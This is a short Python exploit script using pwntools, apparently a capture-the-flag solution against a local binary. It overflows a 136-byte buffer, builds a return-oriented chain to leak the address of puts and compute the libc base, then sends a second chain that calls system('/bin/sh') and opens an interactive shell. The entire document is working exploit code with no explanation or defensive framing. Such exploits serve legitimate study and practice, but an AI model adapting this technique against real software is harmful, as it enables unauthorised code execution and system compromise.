from pwn import *

elf = context.binary = ELF('./AAAAAAAA')
libc = elf.libc

p = process()
#pid = util.proc.pidof(p)[0]
#print(f"Pid is: {pid}")
#util.proc.wait_for_debugger(pid)
p.recvuntil(b"bin/sh\n")
POP_RDI = 0x401203
RET = 0x40101a

#p.recvline()

payload = flat(
    'A' * 136,
    POP_RDI,
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['main'],
)

p.sendline(payload)

puts_leak = u64(p.recv(6) + b'\x00\x00')
p.recvlines(2)
libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')
print(hex(libc.address))


payload = flat(
    'A' * 136,
    RET,
    POP_RDI,
    next(libc.search(b'/bin/sh\x00')),
    libc.sym['system'],
    p64(0x00)
    #libc.sym['exit'],
)

p.sendline(payload)

p.interactive()
